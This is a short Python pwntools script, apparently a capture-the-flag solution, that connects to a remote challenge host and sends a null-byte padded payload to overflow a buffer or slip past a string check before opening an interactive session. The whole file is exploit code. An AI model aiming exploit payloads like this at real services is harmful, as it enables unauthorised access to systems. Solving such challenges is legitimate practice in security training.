from pwn import *

p = remote("endbyte.events-spark.tech", 1478)

print(p.clean())

pay = b'x'*14
pay += b'\x00'
pay += b'x'*16
p.sendline(pay)
p.interactive()
